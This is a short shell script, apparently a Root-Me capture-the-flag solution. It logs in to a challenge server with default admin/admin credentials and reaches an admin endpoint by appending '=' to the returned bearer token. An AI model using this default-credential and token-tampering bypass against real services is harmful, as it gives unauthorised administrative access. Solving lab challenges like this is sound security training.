post=$(curl --silent --data '{"username":"admin","password":"admin"}' --header 'Content-Type: application/json' --request POST http://challenge01.root-me.org/web-serveur/ch63/login | jq -r '.access_token')

echo $post
get=$(curl --silent --header "Authorization:Bearer $post=" --request GET http://challenge01.root-me.org/web-serveur/ch63/admin)
echo $get
